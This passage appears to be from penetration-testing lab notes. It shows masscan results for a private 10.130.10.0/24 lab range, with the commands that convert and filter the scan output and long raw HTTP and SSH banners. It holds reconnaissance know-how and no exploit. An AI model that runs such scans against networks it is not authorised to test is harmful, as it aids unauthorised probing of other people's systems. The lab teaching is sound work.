{   "ip": "10.130.10.11",   "timestamp": "1727151523", "ports": [ {"port": 80, "proto": "tcp", "service": {"name": "http.server", "banner": "nginx/1.24.0 (Ubuntu)"} } ] }
,
{   "ip": "10.130.10.11",   "timestamp": "1727151523", "ports": [ {"port": 80, "proto": "tcp", "service": {"name": "title", "banner": "Welcome to nginx!"} } ] }
,
{   "ip": "10.130.10.11",   "timestamp": "1727151523", "ports": [ {"port": 80, "proto": "tcp", "service": {"name": "http", "banner": "HTTP/1.1 200 OK\u000d\u000aServer: nginx/1.24.0 (Ubuntu)\u000d\u000aDate: Tue, 24 Sep 2024 04:18:42 GMT\u000d\u000aContent-Type: text/html\u000d\u000aContent-Length: 615\u000d\u000aLast-Modified: Wed, 11 Sep 2024 23:16:45 GMT\u000d\u000aConnection: close\u000d\u000aETag: \u002266e224dd-267\u0022\u000d\u000aAccept-Ranges: bytes\u000d\u000a\u000d"} } ] }
sec560@560vm:~/Downloads$ 
```

#### 6: List Format

```
sec560@560vm:~/Downloads$ masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oL /tmp/masscan_10.130.10.0_24_full.txt
[+] --readscan /home/sec560/labs/masscan_10.130.10.0_24_full.bin
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ head -n 15 /tmp/masscan_10.130.10.0_24_full.txt
#masscan
open tcp 80 10.130.10.11 1727151519
open tcp 80 10.130.10.6 1727151523
banner tcp 80 10.130.10.11 1727151523 http.server nginx/1.24.0 (Ubuntu)
banner tcp 80 10.130.10.11 1727151523 title Welcome to nginx!
banner tcp 80 10.130.10.11 1727151523 http HTTP/1.1 200 OK\x0d\x0aServer: nginx/1.24.0 (Ubuntu)\x0d\x0aDate: Tue, 24 Sep 2024 04:18:42 GMT\x0d\x0aContent-Type: text/html\x0d\x0aContent-Length: 615\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:16:45 GMT\x0d\x0aConnection: close\x0d\x0aETag: \x2266e224dd-267\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0a\x0d
open tcp 3389 10.130.10.21 1727151524
banner tcp 80 10.130.10.6 1727151526 http.server Microsoft-IIS/10.0
banner tcp 80 10.130.10.6 1727151526 title IIS Windows Server
banner tcp 80 10.130.10.6 1727151526 http HTTP/1.1 200 OK\x0d\x0aContent-Type: text/html\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:28:42 GMT\x0d\x0aAccept-Ranges: bytes\x0d\x0aETag: \x2282b3d57a24db1:0\x22\x0d\x0aServer: Microsoft-IIS/10.0\x0d\x0aDate: Tue, 24 Sep 2024 04:18:45 GMT\x0d\x0aConnection: close\x0d\x0aContent-Length: 703\x0d\x0a\x0d
open tcp 3389 10.130.10.5 1727151531
open tcp 135 10.130.10.7 1727151534
open tcp 8172 10.130.10.25 1727151536
open tcp 5985 10.130.10.21 1727151539
open tcp 5985 10.130.10.23 1727151539
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep -w 'tcp 22' /tmp/masscan_10.130.10.0_24_full.txt
open tcp 22 10.130.10.22 1727151568
banner tcp 22 10.130.10.22 1727151599 ssh SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14(\x82\x18\xf5\xbc\xe4\x9am\xea\xe2s\x00;\xa9\x03 \x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0a\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\xbbQ\xd7\xfc\xc4\x07\x87\x90\xc2f\x84\xc9/C\x1af\xa0\x91\xd9\x89\x7f\xae\x9cS\xab\xc0\xack\xf0\xca\x83[h;\xe4\x00\xf7w\x85\x9b\xe5\x82\x9a\xfc\xee\xd3\x04\x80a\xd2vh\x93\xed\xec\xfd\x96j+\x11Y\x08\xcd\xd6\xfe0K\xb4\x17\x95\xf1N(\xc1\xd8D\xf9s\xe8;|\xaf\xddl`G\xc7fun\x9c\xbc\xad\x8b\xbdT\xf4\x99\x00\x89\xec`\x1b\x88Q\xfa,E\xa5d\x0c\x83\xb0I\x0d\xaab\xc1\xef\xa1$M\x93\x12;\x13\x8a\xc1\xbf\x1c\xbf\xad\x9f\xf2\xeb2\xf4!\x03mN\xe0\xc72v\xae#\x03\xdc\x05\xb4T\x06\x85\xa1\x0e\xba\xc0\xdb\x86\xf4L\x9f\xe5\xc4\x0c\x80\xd8\x83\xdb\xfe\xf5\xde\x92^\xb5\x0f\x26\xd6\x26*0\x88\x8bf\x0b\x86\x1f\x829\xcf]\xd9\x8b\xc9\x97\xc9T*\x91\xe2\xdb\x19\x16\x06 \xbdW\xc4\xef\xcf1\xd4V\xc4F\x1e\xee\x80\xe49\xee%\xb1\x86\xe4\xa4(\xae\xf7\x03(\xa0\x87g\xe8\xfb2\xf9\xa8\x91\x89bN\xba\xadV#\xd9\x99\x97\xb49)\x8b4\xe6\x84\xde\xba\xa3S\xbbe\xf4\x8c\x1a\x9d\x91\xaa$\x9a\x18\x89\xb7Srn\xf7\xaf\xf2m\x1a\x7f\xf0\xf7\xddE\x99\xc9g$\xc1\xecC\xe8\xab\x95\xa9\x16\xd8\x06B\xf4\x8b\xe5@u\xa3@\xeb\xb7\xe7\x8a\xa6\x86\xe15\x1cO\xae\x97\xd5\xcc|\xd2\x92!!\xed;\xaa#d\xae\x12\x8au\x7f\xe8\x05M9\xacKc\xc3h\xee\x3cZ\xe3i\x1a~NQ0\xbed\xbc\x11\xd3\x04~9\xc3T$M\xb6d\xe2)\x8a\xc7\x8d\x11\x15\xc0\xfdtB\x05\x00\x00\x01\x01\x00\xf4\xf6$\x81i\xe7b.\x0eG\xf7\xd1@U2K\xf1o\xee\xf3D\x8a\xa8d\xe5\x8c\xe2\x0fV*n\xf1y\xba\xfc\xd1\x16/\xfc\xe1\xfe[TD\xc9r\x27$\x86\xfe@\x86\x11n\x82\xe6\xeeh\xf0\x80\xa8\xb2\xaa\x9b)\xe0N\x8d\xf4\xe6\xf0q\xbf\xfc\x8a\x0c\x0b\xd1\xd4RJ\x0a\xbeYB^\xb6\x0d\xc4x\xaf\x84\x9b\xf7\xb8\x03\xc9\x17\x82\x8a\x14\xd9\x04A\xb6{1\x82\xf4\xfch\xfa\x13\xef\xcf\x85Y\x3e\x1a\xd2\x9a:\xaaF\xa7\xcb\xfaB\xfc\x18%\x05O\xf1\xd2PL\xd2s\xd3/\x0e\xa4\xffy\xb9\xb1\xeb\x82\x1c\x86\xa2\xe2\x90\xa3\xcaWG?\x0a\x9b\x11\x81\xd4\x09\x90\x0f\xfbF\x89\x18\xb2\x0d\x8e^8PF\xae\x27\xbb\x9a\xc0\x97k^\xa2\x94\x82\x16\xc4f\x9f$\xb3\x1d\xc2\xa9\x1c\x9f-\xe4\xc9*\x1c\x0eD\x91\xc2A\x99q4\xb0z\x93\xffV0\xbc\x7f\xcc\x03RN\xb4f\xf8\xebCn`\xd2g\x96G\x01\xcf\x12aLfO\xa9W\xa0\xdc\xca\xd8\x0d\x22X\x87\x90\xe3\x9c\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80Q7\xda\x08\x82R\xa9\x08\xf2\xf2L\xc9,\x8c\xf2\xe27bCA\xb8:%\xd4\x8c\xbd\x00*\x0aP\xcb\xc1i\xa27E\xdf\xce\xfd~K\xcb\xd9\xf7\x804I\x0e`\xe1\xb0\x8d\xb4\xc7a\xa0\x01\xab\x11;\xda\xd8\xb0\xddHi\x9a\xad\x1a\x0anZ\xf7\xfa\xcf\xb6\xa9\xcc7\xbb\xa2\x81\x26/-\x9b(\x1a_\xbaCd\x17\xb0*`\xee\xae\x05t@S\x12xi;\x984_\xb38\xb7\x09\xaeX\xb8 \x13m\x00\xd9(\x82\x82\xcf,\xe9g\x98\x89(\x88\xb8\xd1\xd2/\x1b\x89\x8a\xae\x1f\x93\xcf~\x1b.\xc5\xa0\x0a\x15\xd4g\xe5\x95\x170\x1e\x95\xf3\xa8\xc8\x92\xa4\x13\xdfO\x13?uQ\xe4\x17\x0b\xf1\xc1\x13\xe4A\xb0\xbc\xfbL[e\x12\x840\xd2\x85\xd6MU\x11\x07\xe5\x81\xa3~\xa9\xae\x1e%\xf7\xc0HS\xc9\x3c\x96\xba\x83\x86\x22S\x19\x16cOtA\xc5\xe7\x9b\x02\xf2\xb0$p\x17\xf5\xf4?\x19f\x1a\xfb\xfe4L$\xb3Yg1\xa9h\xc5\xa4\xa0Vr\x99a$\x17Ef`\x88\xf1\xa1h\xa4\x17\xb7\xb5\xd3\xf7.\xc5 \x09G\xc0\xbf\xa1yC\x1f\x10Jr\xa1@X\x1a*\x8e\xaf\x03\xe1I\xc5\xe8\xb6\xdf\x08:\x09o\xc87%\xf6\xa9\xbd%\xf3\x18\xff\x81\xf5@vj}G\x012\x90\x13T\xf0\x8d\xa7z\xd6Os\xf6MHwh\x04\x10\x8b@\x08\xb2\xc4\xbb\xeb\xb0\x8f\xa6\xcf\xdc\xc9\xb32%n\x9a\xc8;8R\x02\xe5\xdcr\xd2\xe5\xc5\xd5\x88Y\xfd!{\xe8\xd5\x996\x0e!\x81\xbe\xdd5\xbby\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17(\xfb\x90\x8e\xf0\xee\xba\xa9Q\xce\xc5fH)k\xfc\x86\xa7D8\xb1K\xca\x82\xa4\x82h\x93\x0bJ\x1a\x0b\xf0*\xdd\xfdu\x90\x87\xa0\xe7\xc6;\xa7\xd2{\x01A\xc4\xe48\xb5\x1eN\xb2\xa4j\xc7\x01@X4\xe6\x82\xe7\x9d\x27\xd1\xdc\x84i\x05\x9e\x8e\x3c\xb9q\x86hQ\xdbQ\xda\xe8\xe5o\x89r.\xec\xa7\xc2K\xb6|\xf4\x22\xcd\xaa\x9a\xee\x14Zm\x3c\xdf\x88\xef\xf3A\xa9\x07\x01\x11\x0d\x15\x19\x14_\xc6\x13\xc07\xd5\x8ctbwUp\xd4\xa9Bx\xb7\x9d|\x1eb\xbd\xff\xa4\xd2A\x17\xcc\xe8\xb0\x8b\xf7\xc3F\xf6}\xafX\x99!\x08R\xcbw\xe8\xf4\xc3\x80\xb1\xee\x83\xfbs\x11\x92\xd2\xb1[\x1a\x7fh\xbawN\x9a\x1d\xdb\x1f\x0b\xdc\x96\xee\xba\x02\xbah\xcf\xe3\x97\xb3\xee\xf7\xd8\x01\xd9\x99\xa5\x13\xd9\xa3+\xab|\x13k8V
open tcp 22 10.130.10.10 1727151726
banner tcp 22 10.130.10.10 1727151759 ssh SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14\xd9\x8f\xde\xc2\xd5\x05\xcc\x13\xfb\xa9\xe3\xf09cb\xa9\x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0b\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\x91\x81fY\xf3*7\x01)w\xaeJ\xde\xaeB\xa7bfL$\xb2\x82\x9bq\xc4ToB\xd5\x5c\xf8[\xd2\xbf\xb8\xc5\xcd\x0a\xdc\xa5\xacPX\xb8\xa0\xd4\xe1\x08\xean\x8e\x8d\xb8\x8ew\x17\x9a\x17+\xb7;\xda\x18\xc9\xeb\xbf{dV%\x7f+~ \xfaC\xcb\x05%\xb5\xa2\x99d\x89\xb2\xf9\xbe\x10E\xea\xb9B\x83\x1a\x8d\xa7O\xe4\xfe6\x07\x8d\xdb\xf7\x8c7^\xb5\xcaW\xf2Q\xb7\x84\xad!\x1bYs\x83`\x00\x12\x133B\x1b\x02\xcd\x93\x91\xfe\x97\x80\x1e\x0a\x09o\xbb\x07}1\x96{ \xdcC\xfawM\x8eBh\x17\x10\xe9Cx\xb0\xd3\x9d\xac\xae\xa6q\xc6\xc3\xc3\x9c\x14\x99\xbeW\x85\xad\x3c\xd2\xb6\x14\xe8u\xd4\xd2\xceh\xba/,\x9fSi\xee\xce2\x1aKo\xd8Y\xc2\x19h\xf5\xd8\x84FWDY\xba\xc1\xa2\xc1\x072~\xce\xac\xa4f+\xc9\xe6\x08\xa1p\x26\x1fR\x9e\xdf\x05\xa3J\xc3\x88\x9b\x8a\xea\xd5\x9f\xc2\x9b\xc4\xcbU\xed\xb6\xae\x8f\x09\x17\x04=_\xa5 9\xd0\xdd^1\xf1\xbc\xc9\x22\xbci/\x9c\x03\x18L\xa9\x922i\x10K\xf1\x3c\x97\x3cw\x8d\xe1\xadw\xab\xc8 \x0a^Y\xae\xa5\x84S\xc5R\xad\x1d\xd7\xf4\xf9\xa5XA\xa1\x91K\xeb[2d\x3e\xb6CKyax\xbc\xe8\x05\xabb\x5c\xcdQu\x8c\xec@nLNU\x1e\xaf\xa5\xf4\x1d\x1c\x90\x13v\x18\x0cZ,3\xb3\x15\xbcs)\x8d@\xb8\x97U\xf1\x8b\xc8\x00M\xa7^\x5cH2\xf5\xe8\xd4\x8b\xd9\x1d\xae\x1e\xc9nT\xd9\x00\x00\x01\x00X~\xa8n\x1a\xafN\x0f\xb7\xd5\x3eE\xf7\x8ec(\x3c\xed\x26h\xee\x8e\x02\xb0+]\xf4\xee\x1a\xf3\xa4\xe9\xc4|\xe8\xe6\xe8S*\x85g\xbbT\x01\x0a\xa5\xa5\x87\xc8\xec\x27\xec\xac\xcd#7\xc9\xe7xt\x983\x93\x01\xfe\x98;\xb7]#\x9b\xf4P\xbc\xe1\xf3i\xc6*\xd3\x1c\x91\x1af\xd2\xe8\xdd\x9cr\xb7\x89b_\xd6\xdal\xae\x1dU\xb2\x16\x9c\xa3\xf0\xbf\xa4?\xcb\xcd\x9b\xf1k\x85\xcb\xd19\xb8\xf3\xf3qI\xeeeVb\xde\xc2dz\x0bw=\xda\xfd\xec\xca\x8f\x8f\xec4\xfb\x95\xb0\xe4\x188\xc5\x1b\xe6\x95\xf3\xado\xb0V\xf3\x9c!\xd3\xdc\x7f\x0f\x1d\x11y\x88\x0b\xd9\xa7\x10\x95\x18K\x15\x94\x92\xfe\x13\xc4\xac\xda%\x86\x06w\x1a\xe9\x90:\xe1kQA\x0b\xbb\xb2$\x04\xd5Z\x91Q2\xe0\x5c\x0d\xc7\xe3+tp\xf8\x8f\xa1\xdcu\xe4\xbd\x90\xcf\xcc\x8b\x19K\x27\xe4\x04l\x3c\x04r\x06T\xe2@\x172\xb1,\xf2U\xdd\xa8\x89\xc1^I\x90\x90\x0f\x8d\xdd.\x99\xabq\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80\x22\xcd\xd1\xd2\x87n\xcb\xe2(1\xedl\x05^\x86J\xa2}\xc7\xeaZ\x00\xf6\xd3\xb5\x075t\x26\xf79.\x05d\xe5\x81r\xb9\xf8.`h\xae\x0d\x18\x0d\x99\xaa\xf5\xb8\x05y\xd6\x88\x91\x97\x86#Qk\x9c\xe0\x8e\xe4}\x3c\xd8\xaf\xc6\xf7\x0c\xdd\xfe,t\x09q\x80\xc2\xf30\xd3z\x7f\xb3\xc8\xf7x7\xeblr\x11\x9c\x12t\xe4\x866\xa2L\xfa\xc4zo\x955\xa6~\xecc\xed\xf9\xad\x98\xa7\x8fu\x164\xf6VA\xd7\xb7\xe8dz\xc6=\xd0Z\x11\x27\x98\xf9*\xb9\x1e#\xaa\xed\x98\x17)\xb3\xe7}\xc7\xd5\x16h\xe2C\xa8\x0a0\x98re\xc3Jq\xe82\x87\xb9c\xaeFs*\xd9\x22\x19\xb6\xd9\xe7N\xb1r$\x06q\xa0E\x05\x88\xaeQ\x8a\xd4d\x0az\xb9L\xa2$\xd2\xe3M|\x00\xea\x27\x93\x030\x12J\xe3\x9a\xcf6\xe3\x13\xd2\xbd\xa6sL\x1c\xdei4\xa7\xdb\xe8\x92\x10\xac \xbd\x88W\xe3\xf5\xd9q\x0a\xec\xa4\xe4\xe9\xc3\x95{G\xd2\xaf+\x8e\x14\x9d.\x07o\x10J\xe5\xfcY\xf3\x92(\xdd\x16d\xf7\x18K~\xc9\xc3w\xce\x17\x26\xfd\x02\x1c\xee\x08\xde\xc8\x27\xc9P\xeb\xab8\xad\x11@\xbc\x07[\x81\xf8N\xb0\x83\x94\xdf,R]g\x0f\xc7*\xe5\xb8\xbe\x92+u\xc7\xb7GF2\x19\xe1#@\x9b\xdc%v\xc3\x0f\xf9\xa0\xdb\xfc_\xd9\x1c\xf5\xf3f\x05\xbfR^\x99\xda]\xea.R\x0a\x9eY\x13\xbf\x1f\xd6\xe9\x26\x9a\x86\x9c9\x8e\xe6.\xe4\xb3\xaa\x0fQN\xf52\xab\x0c\xf8\x10-\xf5\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00~\x00e\xe5\x16\xc1F\xedD\xe1{.u#\x95\xa7\xfd\xf8~(\x9e\xe4\xdej\x22\xff\x13\x0au\x9a\x90\x01w\x0d\xba\xa6\x26e\xfd\xaf\x5c\x93\xd2{\xdc-`:\xfd\x01?\x18W\x1d\x09\x1d/\xbf\xe7\x07\xe4\x5cce\xe9\x82\x3c\xc5\xd3\xa8\x91\xb9\xb9\xe1f\x83\x8e\xb2\xbe\x0eL\xf7\xdaD\xa41W\x18\x954\x95\x92%\xbdA\xf94=A\xc3hi\xf6]\x9d\x0b\x0d\x9b\x05\xa5\x87\x16\x8c\x98\xc4\x06\xd4\x00\xf7d\xc5\xd4i\xe4\x8b\xe2 \xed\x1f\x0a\xfc\xca\x5c\xb1r\xe1\xaaD\xa7\xe6\x8f\xd9\xe4\xf3\xe4\x8c\x3c\x13T\x95;\x99\xd2k\xc1\xab\x06\xe9\x1cc\x1b@:\xeb\xfe4|\x9e0\xa6\xf2\xb0\xd4b\x87%\xffD?3H \x99\xb9\xa7\x14\xd1\xa1\x80\x3e\xcd*\xb0\x97\x14\x1biw\x00\xc9i\x91M\x8d\x92\x8c\xc2\x99m\xfd\x17\xaf\xcb\xa9\xd9\xa3
open tcp 22 10.130.10.11 1727151815
banner tcp 22 10.130.10.11 1727151849 ssh SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14\xe6s=A;\xa1\xfb\xe9\x22\xae\xbcz\x86\x87\x18O\x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0a\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\xec\xc8C\xd6\xeb\xbe\x83%\xa74\xbc\xa9 r\xff\xaf\x17j\x9c1\xf0\xb7\x82\xfa\x84\xd7\xe0L\xc7\xfd;3\xfe\xd9!\xbf\xc2Uo\x90\x05\xadg\xa5\x942\x8fc\x16t\x0a\x88\xac\xb7\xbf\xf7\xda\x0c\xebC]\xcf\xa3\x81\xf0\x94\x0f\xa3\x89\xf2\x0f\xdb\xe1\x9d\xf8]i\xb4A\xa0\x18:\x8a\xb7\xff\x93\x8d\x1b\x87e7\x06Oh\x81\x3ejiuE\xda\x94\xac\xd0\x7fL\xc5\x1b\xc8\xbat\xfa\xa3\x03\xad\x09)!\xf1\x0a\xc0\x8c\xb4\xe6\x1b\x05\xfc\xbc\xa9;\x9f\x86\xd4\xe8\xf4}\x08E|\xa3\x0f\xc1\x1b\x18\x87\xde\xcf\xa8\xc0\xde\x17\x3c\xf8W\xff\x0d\xde\xac\x11~)\x0a\xc6\xa3\xe6|g\xe0\xf0R\x95X\xb9+\xb5z\xea\xd5h\xa8\xf8\x88QN\xa4\x27\x0e\xcc\xab\x27\xf6\xaa\xdae\xf6\x0d\x8aC\xad\xf5\x192\x13\xc7\x8f:\x99\x0b\xf1\xa2\x9f1\x8b\xf1Z\x85\x26\x1b\x27\xb8E\xcey\xe6\xf0S\xc6\xa3F\xa2\x0f\xa7kt;h\x96=o\x22\xb7n\xafB\x94m\xe97]\xab\x8a\xd4\xa7\x19\x8d\x11\x0c\x18\x922\xa1\xc3\x18\xd6\xe2h\x95\x9b\xdf\x00A\xceO\x0d5fR\xa9^\xe9\x3e\x7f\x15\xe7y6`-\x26\x90\x278\xc6\xb5}h\xe2\x11n\x85B(g,\x83\xa0sW\xdf\xc5\xe6o_\x83u-S\x5c\xbb\xaf\xb6n\x0bK\x84\x86v\xb3\xbb\x9e(3\x98U\xc5\x10jX[\xd9\x17\xa0\x1a\xff\xeb\x1a\x262\xef{\xc8\xc4\xff\xc7\x1dC\x07\xefX\x18\xdc\xb5W\xee\xc0\x95v\x1cNky\xfei\xf3)\x22\xb23G\xd8\x9b\xe05\xfd\x00\x00\x01\x01\x00\xe1\x27\x958\xad\xee\x86]\x98\xc1m6\x1a\x9a\xd7\x9cF\x9c\xa4]\xd3U\x80\xee{=\xfc\xd8\x9c\xeeL\xae\xc0YH\x96M\x85\x947\x0ee\x0eP\x98k4\xc6\xb2\xee\x09Z9\x8d\xee\x04\xd5\xfa\x0c\x97i\x97\x0d\x06\x11Xg\xfc\xe1\xd9\xb7\x09\xcb\xb3E\xda\xf5\xacg\x1a\x0f\xa5\xcb\xb3\xed\xabo\x89\xfd?\x3e\x9bW\xe3!4D\x021,\xc7\xef\xd10\xf4\x9dL\xd2\x14\xc6n\xb3\x07\xe8\xb09\x5c\x98DU\x82\x0c#\x0c]\xdf\xa3|\xe9^Gqi\xef~\xf5\xf3\xf9\xe5\xedPm)\xa3\xbaF\xafS\x8c\x9fas\xa0\x0a5h\xb8bU2\xb07\xf8\x88W\x17\x15P\x8e\x0bJKK3\x86\x988\xabOy\x02\x14Mq\xd6Y\xe8\x9f\x81\x06\x91!\xad\xe3\xfes\xeb\x0a-\x1c\xa0\xe5Y\x8f\xd9|\x9e\x90\xb2\xae\xbb\x1f\x89\xf3\xe2\xf9\x94\xfc\xa2\x9c\xdd\xa1!\xd8Qn\xe0\xd3\x26P\xfc\xc6\xe1\x09\x0c6AwT\x0d2\x85\xa78\xc9G\xf6\x18H\xb5B\xfa\x85[M\x26\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80\xa4\xfe\x84B\xe5\xb5\xf2\x5c\xd3Q\xa4n\xbb\xfep\x04\x1e\x89_)\xeb\xa1\xea\x8dh\x89\x16fu\x17\xf3\xdd\xee\xa2\xa7\x8a\x8b\x10\x0b\xc4g\xbe \xb7\xb2A\x97\xd8\xc9\xd9\xa3\x5c\xbe\xb6\x22p\xd7\x89:\xe3kEuF\x8bO\xbdR\xd1\xb8\x85!}\x08b\xe5\xd0({|\xefd\xda\x12\xc1.\x22\x9c\x86\xe9GI\xe6\x0f\xe0\xb2\x08A\xc6\xb0\xc2,\xbb\x88\xbf}\xed\xddd\xe7\x00\x8f\xed\xd6\xf3B\x88z_\xb6\x8d\x91k\x1a\x9076\xaf$z{\x27\xf7d\xd5.\xc3v{\xc0\xad\x0f\x96\x3e9\x8aF\xb8h\xd4\xb0\xd2g\x8a\xafk\xc5T8\x17\xc8Y\x04\xcb\xfe\x0d\xc6\xc8\xa1.\x19\x1d\xcc\x98\xed7\x19X\x26\xfc\xf7b0\x26\xb4\xd0\x82*U\x84b\x08\xc1\x98\xce\xb5\xbcn\xa7 ]\xf9\x0c\xb0\xe4\x0825X\x9d*\x0ci\xd3\xa0\x0a.M(\xb9\x17fgO\xa6\x18\x0b\xba[\x07\xbb\xdb\xcei\x22\x09w\xafA\xb6\xb1\xd8\x9f\x98\x0f\x98K\x9bsa\xf5^ht\x0b\xfd\xd9@\xd4\xcb\xae\xe9,\x0610\xca\x17\x1d\x0b\x9f\x8c.\x9aD\xa4\xfe\x86\x12\xa2\x08,|\xe5\x8c2\x8f\xf0\x9dUx\x7f\xf8~x#m/\x9cz\x97\x85L\xd1-\x1a\xb8F\xf7X\xd6A\xc9\x94\xc5G\x3e\xdfC\x0a*\x9e\x9b5\xb0*\xa6\x04\x0a\x8b\x80~\x19\x14\xe8\xbf\xd2(\xd3\xe9\xae\xe3!iu\xfb 